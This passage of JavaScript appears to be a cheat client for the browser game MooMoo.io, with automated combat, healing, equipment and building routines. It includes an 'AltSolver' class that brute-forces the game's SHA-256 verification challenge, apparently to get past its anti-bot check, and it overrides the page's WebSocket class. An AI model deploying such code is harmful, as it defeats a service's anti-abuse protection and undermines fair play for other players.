      for (let i = 0; i < config.resourceTypes.length; ++i) {
        this[config.resourceTypes[i]] = moofoll ? 100 : 0;
      }
    };

    this.getItemType = function (id) {
      let findindx = this.items.findIndex((ids) => ids == id);
      if (findindx != -1) {
        return findindx;
      } else {
        return items.checkItem.index(id, this.items);
      }
    };

    this.setData = function (data) {
      this.id = data[0];
      this.sid = data[1];
      this.name = data[2];
      this.x = data[3];
      this.y = data[4];
      this.dir = data[5];
      this.health = data[6];
      this.maxHealth = data[7];
      this.scale = data[8];
      this.skinColor = data[9];
    };

    this.updateTimer = function () {
      this.bullTimer -= 1;
      if (this.bullTimer <= 0) {
        this.setBullTick = false;
        this.bullTick = game.tick - 1;
        this.bullTimer = config.serverUpdateRate;
      }
      this.poisonTimer -= 1;
      if (this.poisonTimer <= 0) {
        this.setPoisonTick = false;
        this.poisonTick = game.tick - 1;
        this.poisonTimer = config.serverUpdateRate;
      }
      if (this === player) {
        if (my.bullTick > 0) {
          my.bullTick--;
          this._bullHatWanted = my.bullTick % 2 === 0 ? 7 : 6;
          if (my.bullTick <= 0) this._bullHatWanted = undefined;
        } else {
          this._bullHatWanted = undefined;
        }
      }
    };
    this.update = function (delta) {
      if (this.active) {
        let gear = {
          skin: findID(hats, this.skinIndex),
          tail: findID(accessories, this.tailIndex),
        };
        let spdMult =
          (this.buildIndex >= 0 ? 0.5 : 1) *
          (items.weapons[this.weaponIndex].spdMult || 1) *
          (gear.skin ? gear.skin.spdMult || 1 : 1) *
          (gear.tail ? gear.tail.spdMult || 1 : 1) *
          (this.y <= config.snowBiomeTop
            ? gear.skin && gear.skin.coldM
              ? 1
              : config.snowSpeed
            : 1) *
          this.slowMult;
        this.maxSpeed = spdMult;
      }
    };

    let tmpRatio = 0;
    let animIndex = 0;
    let crazyFactor = 3;
    let waveAmplitude = Math.PI / -16;
    this.animate = function (delta) {
      if (this.animTime > 0) {
        this.animTime -= delta;
        if (this.animTime <= 0) {
          this.animTime = 0;
          this.dirPlus = 0;
          tmpRatio = 0;
          animIndex = 0;
        } else {
          if (animIndex == 0) {
            tmpRatio += delta / (this.animSpeed * config.hitReturnRatio);
            let progress = Math.min(1, tmpRatio);
            this.dirPlus =
              UTILS.lerp(0, this.targetAngle, easeInOutSine(progress)) +
              waveAmplitude * Math.sin(progress * crazyFactor * Math.PI);
            if (progress >= 1) {
              tmpRatio = 1;
              animIndex = 1;
            }
          } else {
            tmpRatio -= delta / (this.animSpeed * (1 - config.hitReturnRatio));
            let progress = Math.max(0, tmpRatio);
            this.dirPlus =
              UTILS.lerp(0, this.targetAngle, easeInOutSine(progress)) +
              waveAmplitude * Math.cos(progress * crazyFactor * Math.PI);
          }
        }
      }
    };

    this.startAnim = function (didHit, index) {
      this.animTime = this.animSpeed = items.weapons[index].speed * 1.8;
      this.targetAngle = didHit ? -config.hitAngle : -Math.PI;
      tmpRatio = 0;
      animIndex = 0;
    };

    this.canSee = function (other) {
      if (!other) return false;
      let dx = Math.abs(other.x - this.x) - other.scale;
      let dy = Math.abs(other.y - this.y) - other.scale;
      return (
        dx <= (config.maxScreenWidth / 2) * 1.3 &&
        dy <= (config.maxScreenHeight / 2) * 1.3
      );
    };

    this.judgeShame = function () {
      this.lastshamecount = this.shameCount;
      if (this.oldHealth < this.health) {
        if (this.hitTime) {
          let timeSinceHit = game.tick - this.hitTime;
          this.lastHit = game.tick;
          this.hitTime = 0;
          if (timeSinceHit < 2) {
            this.shameCount++;
          } else {
            this.shameCount = Math.max(0, this.shameCount - 2);
          }
        }
      } else if (this.oldHealth > this.health) {
        this.hitTime = game.tick;
      }
    };
    this.addShameTimer = function () {
      this.shameCount = 0;
      this.shameTimer = 30;
      let interval = setInterval(() => {
        this.shameTimer--;
        if (this.shameTimer <= 0) {
          clearInterval(interval);
        }
      }, 1000);
    };

    this.isTeam = function (tmpObj) {
      return this == tmpObj || (this.team && this.team == tmpObj.team);
    };

    this.findAllianceBySid = function (sid) {
      return this.team ? alliancePlayers.find((THIS) => THIS === sid) : null;
    };
    this.checkCanInsta = function (nobull) {
      let totally = 0;
      if (this.alive && inGame) {
        let primary = {
          weapon: this.weapons[0],
          variant: this.primaryVariant,
          dmg:
            this.weapons[0] == undefined
              ? 0
              : items.weapons[this.weapons[0]].dmg,
        };
        let secondary = {
          weapon: this.weapons[1],
          variant: this.secondaryVariant,
          dmg:
            this.weapons[1] == undefined
              ? 0
              : items.weapons[this.weapons[1]].Pdmg,
        };
        let bull = this.skins[7] && !nobull ? 1.5 : 1;
        let pV =
          primary.variant != undefined
            ? config.weaponVariants[primary.variant].val
            : 1;
        if (primary.weapon != undefined && this.reloads[primary.weapon] == 0) {
          totally += primary.dmg * pV * bull;
        }
        if (
          secondary.weapon != undefined &&
          this.reloads[secondary.weapon] == 0
        ) {
          totally += secondary.dmg;
        }
        if (
          this.skins[53] &&
          this.reloads[53] <= (player.weapons[1] == 10 ? 0 : game.tickRate) &&
          near &&
          near.skinIndex !== undefined &&
          near.skinIndex != 22
        ) {
          totally += 25;
        }
        totally *=
          near && near.skinIndex !== undefined && near.skinIndex == 6
            ? 0.75
            : 1;
        return totally;
      }
      return 0;
    };

    this.manageReload = function () {
      if (this.shooting[53]) {
        this.shooting[53] = 0;
        this.reloads[53] = 2500 - game.tickRate;
      } else {
        if (this.reloads[53] > 0) {
          this.reloads[53] = Math.max(0, this.reloads[53] - game.tickRate);
        }
      }

      if (this.reloads[this.weaponIndex] <= 1000 / 9) {
        let index = this.weaponIndex;
        let nearObja = liztobj.filter(
          (e) =>
            (e.active || e.alive) &&
            e.health < e.maxHealth &&
            e.group !== undefined &&
            UTILS.getDist(e, player, 0, 2) <=
            items.weapons[player.weaponIndex].range + e.scale,
        );
        for (let i = 0; i < nearObja.length; i++) {
          let aaa = nearObja[i];

          let val =
            items.weapons[index].dmg *
            config.weaponVariants[
              tmpObj[(index < 9 ? "prima" : "seconda") + "ryVariant"]
            ].val *
            (items.weapons[index].sDmg || 1) *
            3.3;
          let valaa =
            items.weapons[index].dmg *
            config.weaponVariants[
              tmpObj[(index < 9 ? "prima" : "seconda") + "ryVariant"]
            ].val *
            (items.weapons[index].sDmg || 1);
          if (aaa.health - valaa <= 0 && near && near.dist2 !== undefined) {
            place(
              near.dist2 < near.scale * 1.8 + 50 ? 4 : 2,
              caf(aaa, player) + Math.PI,
            );
          }
        }
      }

      if (this.gathering || this.shooting[1]) {
        if (this.gathering) {
          this.gathering = 0;
          this.reloads[this.gatherIndex] =
            items.weapons[this.gatherIndex].speed *
            (this.skinIndex == 20 ? 0.78 : 1);
          this.attacked = true;
        }
        if (this.shooting[1]) {
          this.shooting[1] = 0;
          this.reloads[this.shootIndex] =
            items.weapons[this.shootIndex].speed *
            (this.skinIndex == 20 ? 0.78 : 1);
          this.attacked = true;
        }
      } else {
        this.attacked = false;
        if (this.buildIndex < 0) {
          if (this.reloads[this.weaponIndex] > 0) {
            this.reloads[this.weaponIndex] = Math.max(
              0,
              this.reloads[this.weaponIndex] - 110,
            );
            if (this == player) {
              if (AB.Menu.weaponGrind && player.items.includes(22)) {
                let gt = AB.Menu.grindTo;
                let targetTier = gt === "Gold" ? 1 : gt === "Diamond" ? 2 : gt === "Ruby" ? 3 : gt;
                let pTier = player.primaryVariant == undefined ? 0 : player.primaryVariant;
                let sTier = player.secondaryVariant == undefined ? 0 : player.secondaryVariant;
                let shouldSkip =
                  (pTier >= targetTier && sTier >= targetTier) ||
                  (pTier >= targetTier && player.weapons[1] != 10);
                if (shouldSkip) {
                  my.grindPreferred = undefined;
                } else {
                  checkPlace(player.getItemType(22), player.dir - Math.PI / 4);
                  checkPlace(player.getItemType(22), player.dir + Math.PI / 4);
                  let targetWeapon =
                    pTier >= targetTier && player.weapons[1] != undefined
                      ? player.weapons[1]
                      : sTier >= targetTier && player.weapons[0] != undefined
                        ? player.weapons[0]
                        : player.weapons[1] == 10
                          ? player.weapons[1]
                          : player.weapons[0];
                  my.grindPreferred = targetWeapon;
                  my.grindLock = performance.now() + 250;
                  if (player.weaponIndex != targetWeapon) {
                    selectWeapon(targetWeapon);
                  }
                  sendAtck(1, player.dir);
                  sendAtck(0, player.dir);
                }
              }
            }
            if (
              this.reloads[this.primaryIndex] == 0 &&
              this.reloads[this.weaponIndex] == 0
            ) {
              this.antiBull++;
              game.tickBase(() => {
                this.antiBull = 0;
              }, 1);
            }
          }
        }
      }
    };

    this.addDamageThreat = function (tmpObj) {
      let primary = {
        weapon: this.primaryIndex,
        variant: this.primaryVariant,
      };
      primary.dmg =
        primary.weapon == undefined ? 45 : items.weapons[primary.weapon].dmg;
      let secondary = {
        weapon: this.secondaryIndex,
        variant: this.secondaryVariant,
      };
      secondary.dmg =
        secondary.weapon == undefined
          ? 75
          : items.weapons[secondary.weapon].Pdmg;
      let bull = 1.5;
      let pV =
        primary.variant != undefined
          ? config.weaponVariants[primary.variant].val
          : 1.18;
      let sV =
        secondary.variant != undefined
          ? [9, 12, 13, 15].includes(secondary.weapon)
            ? 1
            : config.weaponVariants[secondary.variant].val
          : 1.18;
      if (
        primary.weapon == undefined ? true : this.reloads[primary.weapon] == 0
      ) {
        this.damageThreat += primary.dmg * pV * bull;
      }
      if (
        secondary.weapon == undefined
          ? true
          : this.reloads[secondary.weapon] == 0
      ) {
        this.damageThreat += secondary.dmg * sV;
      }
      if (this.reloads[53] <= game.tickRate) {
        this.damageThreat += 25;
      }
      this.damageThreat *= tmpObj.skinIndex == 6 ? 0.75 : 1;
      if (!this.isTeam(tmpObj)) {
        if (this.dist2 <= 300) {
          tmpObj.damageThreat += this.damageThreat;
        }
      }
    };
  }
}

function easeInOutSine(x) {
  return -(Math.cos(Math.PI * x) - 1) / 2;
}

function sendUpgrade(index) {
  player.reloads[index] = 0;
  packet("H", index);
}

function storeEquip(id, index) {
  if (player) {
    const now = Date.now();
    if (index === 0) {
      const last = player._lastHatEquipAt || 0;
      if (now - last < 80) return;
      if (player.latestSkin === id && now - last < 120) return;
      player._lastHatEquipAt = now;
      player.latestSkin = id;
    } else {
      const last = player._lastTailEquipAt || 0;
      if (now - last < 80) return;
      if (player.latestTail === id && now - last < 120) return;
      player._lastTailEquipAt = now;
      player.latestTail = id;
    }
  }
  packet("c", 0, id, index);
}

function storeBuy(id, index) {
  packet("c", 1, id, index);
}

function buyEquip(hatId, tailId, disableMonkeyTail = false) {
  if (!player.alive || !inGame) return;

  const equip = (id, index) => {
    const equipped =
      index === 0
        ? player.skinIndex === id || player.latestSkin === id
        : player.tailIndex === id || player.latestTail === id;
    const owned = index === 0 ? !!player.skins[id] : !!player.tails[id];

    if (equipped) return;

    if (index === 1 && disableMonkeyTail && id !== 11 && id !== 0) {
      const zeroEquipped = player.tailIndex === 0;
      if (!zeroEquipped) storeEquip(0, 1);
      return;
    }

    if (owned) {
      storeEquip(id, index);
      return;
    }

    if (configs.autoBuyEquip) {
      const itemList = index === 0 ? hats : accessories;
      const find = findID(itemList, id);
      if (find && player.points >= find.price) {
        storeBuy(id, index);
        storeEquip(id, index);
        return;
      }
    }

    const fallbackId = index === 0 ? (player.skins[6] ? 6 : 0) : 0;
    const zeroEquipped =
      index === 0
        ? player.skinIndex === fallbackId || player.latestSkin === fallbackId
        : player.tailIndex === fallbackId || player.latestTail === fallbackId;
    if (!zeroEquipped) {
      storeEquip(fallbackId, index);
    }
  };

  if (tailId === 0 || tailId === 1) {
    equip(hatId, tailId);
    return;
  }

  equip(hatId, 0);
  equip(!disableMonkeyTail ? tailId : 0, 1);
}

function calcInstaDamage(attacker, target, nobull = true) {
  if (!attacker || !target || !attacker.alive || !inGame) return 0;
  let total = 0;

  const primaryWeapon = attacker.weapons?.[0];
  const secondaryWeapon = attacker.weapons?.[1];
  const primaryDmg =
    primaryWeapon == undefined ? 0 : items.weapons[primaryWeapon]?.dmg || 0;
  const secondaryDmg =
    secondaryWeapon == undefined ? 0 : items.weapons[secondaryWeapon]?.Pdmg || 0;
  const bullMult = attacker.skins?.[7] && !nobull ? 1.5 : 1;
  const primaryVar =
    attacker.primaryVariant != undefined
      ? config.weaponVariants[attacker.primaryVariant]?.val || 1
      : 1;

  if (primaryWeapon != undefined && attacker.reloads?.[primaryWeapon] == 0) {
    total += primaryDmg * primaryVar * bullMult;
  }
  if (secondaryWeapon != undefined && attacker.reloads?.[secondaryWeapon] == 0) {
    total += secondaryDmg;
  }
  if (
    attacker.skins?.[53] &&
    attacker.reloads?.[53] <= (target.weapons?.[1] == 10 ? 0 : game.tickRate) &&
    target.skinIndex != 22
  ) {
    total += 25;
  }
  if (target.skinIndex == 6) total *= 0.75;

  return total;
}

function calcPotentialBurstFuture(attacker, target, ticksAhead = 2, nobull = true) {
  if (!attacker || !target || !attacker.alive || !inGame) return 0;
  const tickRate = typeof game?.tickRate === "number" ? game.tickRate : 1;
  const windowTicks = Math.max(0, ticksAhead) * tickRate;
  let total = 0;

  const primaryWeapon = attacker.weapons?.[0];
  const secondaryWeapon = attacker.weapons?.[1];
  const primaryDmg =
    primaryWeapon == undefined ? 0 : items.weapons[primaryWeapon]?.dmg || 0;
  const secondaryDmg =
    secondaryWeapon == undefined ? 0 : items.weapons[secondaryWeapon]?.Pdmg || 0;
  const bullMult = attacker.skins?.[7] && !nobull ? 1.5 : 1;
  const primaryVar =
    attacker.primaryVariant != undefined
      ? config.weaponVariants[attacker.primaryVariant]?.val || 1
      : 1;

  const primaryReady =
    primaryWeapon != undefined &&
    attacker.reloads?.[primaryWeapon] != null &&
    attacker.reloads[primaryWeapon] <= windowTicks;
  const secondaryReady =
    secondaryWeapon != undefined &&
    attacker.reloads?.[secondaryWeapon] != null &&
    attacker.reloads[secondaryWeapon] <= windowTicks;

  const primaryHit = primaryReady ? primaryDmg * primaryVar * bullMult : 0;
  const secondaryHit = secondaryReady ? secondaryDmg : 0;
  total += Math.max(primaryHit, secondaryHit);

  const empReady =
    attacker.skins?.[53] &&
    attacker.reloads?.[53] != null &&
    attacker.reloads[53] <= (target.weapons?.[1] == 10 ? 0 : windowTicks);
  if (empReady && target.skinIndex != 22) {
    total += 25;
  }
  if (target.skinIndex == 6) total *= 0.75;

  return total;
}

function selectToBuild(index, wpn) {
  packet("G", index, wpn);
}

function selectWeapon(index, isPlace) {
  if (AB.Menu.weaponGrind && my.grindPreferred != undefined && performance.now() < (my.grindLock || 0)) {
    index = my.grindPreferred;
  }
  if (!isPlace) {
    player.weaponCode = index;
  }
  packet("G", index, 1);
}

const Hit = {
  state: false,
  attackState: false,

  auto(mode = null, angle = null) {
    const prev = this.state;
    if (mode === "on") this.state = true;
    else if (mode === "off") this.state = false;
    else if (mode === "toggle") this.state = !this.state;
    else if (mode === null) this.state = !this.state;

    if (this.state !== prev) {
      packet("K", 1, angle ?? 1);
    }
    return this.state;
  },

  attack(mode = null, angle = null) {
    const prev = this.attackState;
    if (mode === "on" || mode === 1) this.attackState = true;
    else if (mode === "off" || mode === 0) this.attackState = false;
    else if (mode === "toggle") this.attackState = !this.attackState;

    packet("d", this.attackState ? 1 : 0, angle, 1);
    return this.attackState;
  },

  once(angle = null) {
    packet("K", 1, angle ?? 1);
  },

  start(angle = null) {
    this.attackState = true;
    packet("d", 1, angle, 1);
  },

  stop(angle = null) {
    this.attackState = false;
    packet("d", 0, angle, 1);
  },

  reset() {
    this.state = false;
    this.attackState = false;
  },
};

function sendAutoGather() {
  Hit.once();
}

function sendAtck(id, angle) {
  packet("d", id, angle, 1);
}

function checkLimit(id) {
  const g = (items.list[player.items[id]] || id).group;
  if (!g) return false;
  return (player.itemCounts[g.id] || 0) >= (g.sandboxLimit || 99);
}

function place(id, angle) {
  try {
    if (id === undefined || checkLimit(id)) return;
    const item = items.list[player.items[id]];
    if (!item) return;
    const scale = player.scale + item.scale + (item.placeOffset || 0),
      x = player.x2 + player.xVel * 0.85 + Math.cos(angle) * scale,
      y = player.y2 + player.yVel * 0.85 + Math.sin(angle) * scale;
    selectToBuild(player.items[id], null);
    sendAtck(1, angle);
    sendAtck(0, angle);
    selectWeapon(player.weaponCode, 1);
    if (AB.Menu.placeVis) {
      placeVisible.push({
        type: player.items[id],
        x,
        y,
        scale: item.scale,
        name: item.name,
        dir: angle,
      });
      setTimeout(() => placeVisible.shift(), 100);
    }
  } catch { }
}

function checkPlace(itemId, angle) {
  try {
    if (itemId === undefined) return;

    const item = items.list[player.items[itemId]];
    if (!item) return;

    const tmpScale = player.scale + item.scale + (item.placeOffset || 0);
    const tmpX = player.x2 + tmpScale * Math.cos(angle);
    const tmpY = player.y2 + tmpScale * Math.sin(angle);

    if (
      objectManager.checkItemLocation(
        tmpX,
        tmpY,
        item.scale,
        0.6,
        item.id,
        false,
        player,
      )
    ) {
      place(itemId, angle, true);
    }
  } catch (error) {
    console.error("Error while checking place:", error);
  }
}

function soldierMult() {
  return player.latestSkin == 6 ? 0.75 : 1;
}

function healthBased() {
  if (player.health === 100) {
    return 0;
  }

  if (player.skinIndex !== 45 && player.skinIndex !== 56) {
    const currentItem = items.list[player.items[0]];
    if (currentItem && currentItem.healing) {
      const remainingHealth = 100 - player.health;
      const itemsNeeded = Math.ceil(remainingHealth / currentItem.healing);
      return itemsNeeded;
    } else {
      console.error("Item data missing or invalid for player's current item.");
      return -1;
    }
  }
  return 0;
}

function getAttacker(damaged) {
  let attackers = enemy.filter((tmp) => {
    let rule = {
      three: tmp.attacked,
    };
    return rule.three;
  });
  return attackers;
}

function healer() {
  for (let i = 0; i < healthBased(); i++) {
    place(0, getAttackDir());
  }
}
function healer33() {
  for (let i = 0; i < healthBased(); i++) {
    place(0, getAttackDir());
  }
}
function healer1() {
  place(0, getAttackDir());
  return Math.ceil((100 - player.health) / items.list[player.items[0]].healing);
}

function noshameheal() {
  place(0, getAttackDir());
  if (player.shameCount >= 5) {
    place(0, getAttackDir());
    healer33();
  } else {
    if (player.skinIndex != 6 && player.skinIndex != 22) {
      healer33();
      if (AB.Menu.AutoHat) buyEquip(6, 0);
    } else {
      const neededHealing = Math.ceil(
        (100 - player.health) / items.list[player.items[0]].healing,
      );
      healer33();
      return neededHealing;
    }
  }
}

function antiSyncHealing() {
  if (my.antiSync) return;
  my.antiSync = true;
  const healAnti = setInterval(() => {
    const shameCount = player.shameCount;
    const attackDirection = getAttackDir();
    if (shameCount < 5) {
      place(0, attackDirection);
    } else {
      clearInterval(healAnti);
      my.antiSync = false;
    }
  }, 75);
  setTimeout(() => {
    clearInterval(healAnti);
    my.antiSync = false;
  }, game.tickRate);
}

function biomeGear(mover, returns) {
  if (!AB.Menu.AutoHat) return;
  if (
    configs.hatCycle ||
    traps.inTrap ||
    clicks.left ||
    clicks.right ||
    my.bullTick
  )
    return;

  if (
    player.y2 >= config.mapScale / 2 - config.riverWidth / 2 &&
    player.y2 <= config.mapScale / 2 + config.riverWidth / 2
  ) {
    if (returns) return 31;
    if (!my.bullTick) buyEquip(31, 11);
  } else {
    if (player.y2 <= config.snowBiomeTop) {
      if (returns) return mover && player.moveDir == undefined ? 15 : 15;
      if (!my.bullTick)
        buyEquip(mover && player.moveDir == undefined ? 15 : 15, 11);
    } else {
      if (returns) return mover && player.moveDir == undefined ? 12 : 12;
      if (!my.bullTick)
        buyEquip(mover && player.moveDir == undefined ? 12 : 12, 11);
    }
  }
  if (returns) return 0;
}

let lastHatChange = 0;
let lastTailChange = 0;
let lastAutoHatState = null;

function Gen(length, type = "alphanumeric") {
  const sets = {
    alphanumeric:
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
    letters: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
    uppercase: "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    lowercase: "abcdefghijklmnopqrstuvwxyz",
    numeric: "0123456789",
    symbol: "!@#$%^&*()-_=+[]{}|;:,.<>?",
  };
  const charset = sets[type] || sets.alphanumeric;
  return Array.from(
    { length },
    () => charset[Math.floor(Math.random() * charset.length)],
  ).join("");
}

class AltSolver {
  constructor() {
    this.cores = Math.min(16, navigator.hardwareConcurrency || 8);
    this.workers = [];
    this.url = null;
  }

  init() {
    if (this.workers.length) return;
    const code = `importScripts('https://cdn.jsdelivr.net/npm/js-sha256@0.9.0/build/sha256.min.js'); let c,s; onmessage=e=>{ if(e.data.init){({challenge:c,salt:s}=e.data); postMessage(1); return;} for(let i=e.data.a;i<=e.data.b;i++) if(sha256(s+i)===c) return postMessage(i); postMessage(0); };`;
    this.url = URL.createObjectURL(new Blob([code]));
    for (let i = 0; i < this.cores; i++)
      this.workers.push(new Worker(this.url));
  }

  async getChallenge() {
    return fetch("https://api.moomoo.io/verify").then((r) => r.json());
  }

  solve({ challenge, salt, maxnumber }) {
    this.init();
    const size = Math.ceil(maxnumber / this.cores);
    let done = 0,
      solved = false,
      t0 = performance.now();

    return new Promise((res, rej) => {
      this.workers.forEach((w, i) => {
        w.onmessage = (e) => {
          if (e.data === 1)
            w.postMessage({
              a: i * size,
              b: Math.min(maxnumber, (i + 1) * size - 1),
            });
          else if (e.data && !solved) {
            solved = true;
            res({
              challenge,
              salt,
              maxnumber,
              number: e.data,
              took: ((performance.now() - t0) / 1e3).toFixed(2),
            });
            this.cleanup();
          } else if (++done === this.workers.length && !solved) {
            rej("not solved");
            this.cleanup();
          }
        };
        w.onerror = rej;
        w.postMessage({ init: 1, challenge, salt });
      });
    });
  }

  cleanup() {
    this.workers.forEach((w) => w.terminate());
    this.workers.length = 0;
    URL.revokeObjectURL(this.url);
    this.url = null;
  }

  static payload(d, s) {
    return btoa(
      JSON.stringify({
        algorithm: "SHA-256",
        challenge: d.challenge,
        salt: d.salt,
        number: s.number,
        signature: d.signature || null,
        took: s.took,
      }),
    );
  }

  async generate() {
    const d = await this.getChallenge();
    const s = await this.solve(d);
    return (this.code = `alt:${AltSolver.payload(d, s)}`);
  }
}

function mouseCoord() {
  return Math.atan2(mouseY - screenHeight / 2, mouseX - screenWidth / 2);
}
function mouseWorldPos() {
  return {
    x: player.x + (mouseX - screenWidth / 2),
    y: player.y + (mouseY - screenHeight / 2),
  };
}
function mouseAimAngle() {
  const cx = screenWidth / 2;
  const cy = screenHeight / 2;
  return Math.atan2(mouseY - cy, mouseX - cx);
}
let mainSocket;
class WebsocketBot extends WebSocket {
  constructor(...args) {
    super(...args);
    this.binaryType = "arraybuffer";

    if (!mainSocket) {
      mainSocket = this;
      document.ws = this;
      this.isBot = false;
      this.addEventListener("message", async (e) => {
        let data;
        try {
          const buf =
            e.data instanceof Blob
              ? new Uint8Array(await e.data.arrayBuffer())
              : new Uint8Array(e.data);
          data = window.msgpack.decode(buf);
          if (data.length > 1 && Array.isArray(data[1]))
            data = [data[0], ...data[1]];
        } catch {
          return;
        }
        if (!data) return;
      });
    }
  }

  send(m) {
    return super.send(m);
  }
}
window.WebSocket = WebsocketBot;
var bottics = [];

class Traps {
  constructor(UTILS, items) {
    this.replaced = false;
    this.antiTrapped = false;
    this.inTrap = false;
    this.info = {};
    this.ranges = {};
    this.preplaces = [[], []];

    const PI = Math.PI,
      PI2 = PI * 2,
      { sqrt, atan2, cos, sin, abs, max } = Math;

    const riverMin = () => config.mapScale / 2 - config.riverWidth / 2;
    const riverMax = () => config.mapScale / 2 + config.riverWidth / 2;
    const inRiver = (y, id) => id !== 18 && y >= riverMin() && y <= riverMax();
    const normalizeAngle = (a) => ((a % PI2) + PI2) % PI2;

    const canPlace = (x, y, scale, itemId) => {
      if (inRiver(y, itemId)) return false;
      if (
        !objectManager.checkItemLocation(
          x,
          y,
          scale,
          0.6,
          0,
          false,
          player,
          null,
        )
      )
        return false;
      for (let i = 0; i < liztobj.length; i++) {
        const o = liztobj[i];
        if (!o.active) continue;
        const dx = x - o.x,
          dy = y - o.y;
        const m = scale + (o.blocker || o.getScale(0.6, o.isItem));
        if (dx * dx + dy * dy < m * m) return false;
      }
      return true;
    };

    this.closestPossibleAngles = (obj, id) => {
      const itemId = player.items[id];
      if (itemId == null) return [];
      const item = items.list[itemId];
      const objScale =
        (obj.getScale ? obj.getScale(0.6, obj.isItem) : obj.scale) + 0.01;
      const dx = obj.x - player.x2,
        dy = obj.y - player.y2;
      const dist = sqrt(dx * dx + dy * dy);
      const D = player.scale + item.scale + (item.placeOffset || 0);
      const E = objScale + item.scale;

      if (dist > D + E || dist < abs(D - E)) return [atan2(dy, dx)];

      const a = (D * D - E * E + dist * dist) / (2 * dist);
      const h = sqrt(max(0, D * D - a * a));
      const px = player.x2 + (a / dist) * dx;
      const py = player.y2 + (a / dist) * dy;
      return [
        atan2(
          py - (h / dist) * dx - player.y2,
          px + (h / dist) * dy - player.x2,
        ),
        atan2(
          py + (h / dist) * dx - player.y2,
          px - (h / dist) * dy - player.x2,
        ),
      ];
    };

    const mergeBlocked = (arcs) => {
      if (!arcs.length) return [];
      let intervals = [];
      for (let [s, e] of arcs) {
        s = normalizeAngle(s);
        e = normalizeAngle(e);
        const span = (e - s + PI2) % PI2;
        if (span < 0.000001) intervals.push([s, s]);
        else if (s < e) intervals.push([s, e]);
        else intervals.push([s, PI2], [0, e]);
      }
      intervals.sort((a, b) => a[0] - b[0]);
      const merged = [intervals[0].slice()];
      for (let i = 1; i < intervals.length; i++) {
        const [s, e] = intervals[i];
        const last = merged[merged.length - 1];
        if (s <= last[1] + 0.000001) last[1] = max(last[1], e);
        else merged.push([s, e]);
      }
      return merged;
    };

    const invertArcs = (merged) => {
      if (!merged.length) return [[0, PI2]];
      const free = [];
      for (let i = 0; i < merged.length; i++) {
        const gapStart = merged[i][1];
        const gapEnd =
          i < merged.length - 1 ? merged[i + 1][0] : merged[0][0] + PI2;
        if (gapEnd - gapStart > 0.000001) {
          free.push([normalizeAngle(gapStart), normalizeAngle(gapEnd)]);
        }
      }
      return free;
    };

    this.calcAngleRanges = (id) => {
      const itemId = player.items[id];
      if (itemId == null) return [];
      const item = items.list[itemId];
      const offset = player.scale + item.scale + (item.placeOffset || 0);
      const rawBlocked = [];

      for (const obj of liztobj) {
        if (!obj.active || UTILS.getDist(obj, player, 0, 2) > 200) continue;
        const angles = this.closestPossibleAngles(obj, id);
        if (angles.length !== 2) continue;
        const [a1, a2] = angles;
        const buildAngle = UTILS.getDirect(obj, player, 0, 2);
        const v1 = canPlace(
          player.x2 + offset * cos(a1),
          player.y2 + offset * sin(a1),
          item.scale,
          item.id,
        );
        const v2 = canPlace(
          player.x2 + offset * cos(a2),
          player.y2 + offset * sin(a2),
          item.scale,
          item.id,
        );
        if (v1 && v2) rawBlocked.push([a1, a2]);
        else if (v1 || v2) {
          const valid = v1 ? a1 : a2,
            invalid = v1 ? a2 : a1;
          const cw =
            (buildAngle - valid + PI2) % PI2 < (invalid - valid + PI2) % PI2;
          rawBlocked.push(cw ? [valid, invalid] : [invalid, valid]);
        } else rawBlocked.push([a1, a2]);
      }
      this.ranges[id] = invertArcs(mergeBlocked(rawBlocked));
      return this.ranges[id];
    };

    this.closeToAngle = (angle, ranges) => {
      angle = normalizeAngle(angle);
      let bestAngle = null,
        bestDist = Infinity;
      for (const [start, end] of ranges) {
        if (
          start < end
            ? angle >= start && angle <= end
            : angle >= start || angle <= end
        )
          return angle;
        for (const ang of [start, end]) {
          const dist = UTILS.getAngleDist(ang, angle);
          if (dist < bestDist) {
            bestDist = dist;
            bestAngle = ang;
          }
        }
      }
      return bestAngle;
    };

    this.notFast = () =>
      player.weapons[1] === 10 &&
      (this.info.health > items.weapons[player.weapons[0]].dmg ||
        player.weapons[0] === 5);

    this.testCanPlace = (
      id,
      first = -PI / 2,
      repeat = PI / 2,
      plus = PI / 18,
      radian,
      replacer,
      yaboi,
    ) => {
      try {
        let item = items.list[player.items[id]];
        if (!item) return;
        let tmpS = player.scale + item.scale + (item.placeOffset || 0);
        let counts = { attempts: 0, placed: 0 };
        let tmpObjects = [];

        liztobj.forEach((p) => {
          tmpObjects.push({
            x: p.x,
            y: p.y,
            active: p.active,
            blocker: p.blocker,
            scale: p.scale,
            isItem: p.isItem,
            type: p.type,
            colDiv: p.colDiv,
            getScale: function (sM = 1, ig) {
              return (
                this.scale *
                (this.isItem || [2, 3, 4].includes(this.type) ? 1 : 0.6 * sM) *
                (ig ? 1 : this.colDiv)
              );
            },
          });
        });

        for (let i = first; i < repeat; i += plus) {
          counts.attempts++;
          let relAim = radian + i;
          let tmpX = player.x2 + tmpS * cos(relAim);
          let tmpY = player.y2 + tmpS * sin(relAim);
          let cantPlace = tmpObjects.find(
            (tmp) =>
              tmp.active &&
              UTILS.getDistance(tmpX, tmpY, tmp.x, tmp.y) <
              item.scale +
              (tmp.blocker ? tmp.blocker : tmp.getScale(0.6, tmp.isItem)),
          );
          if (cantPlace) continue;
          if (
            item.id !== 18 &&
            tmpY >= config.mapScale / 2 - config.riverWidth / 2 &&
            tmpY <= config.mapScale / 2 + config.riverWidth / 2
          )
            continue;

          if (!replacer && yaboi) {
            if (yaboi.inTrap) {
              if (UTILS.getAngleDist(near.aim2 + PI, relAim + PI) <= PI * 1.3) {
                place(2, relAim, 1);
              } else {
                player.items[4] === 15 && place(4, relAim, 1);
              }
            } else {
              if (
                UTILS.getAngleDist(near.aim2, relAim) <=
                config.gatherAngle / 2.6
              ) {
                place(2, relAim, 1);
              } else {
                player.items[4] === 15 && place(4, relAim, 1);
              }
            }
          } else {
            place(id, relAim, 1);
          }

          tmpObjects.push({
            x: tmpX,
            y: tmpY,
            active: true,
            blocker: item.blocker,
            scale: item.scale,
            isItem: true,
            type: null,
            colDiv: item.colDiv,
            getScale: function () {
              return this.scale;
            },
          });

          if (UTILS.getAngleDist(near.aim2, relAim) <= 1) counts.placed++;
        }

        if (counts.placed > 0 && replacer && item.dmg && AB.Menu.spikeTick) {
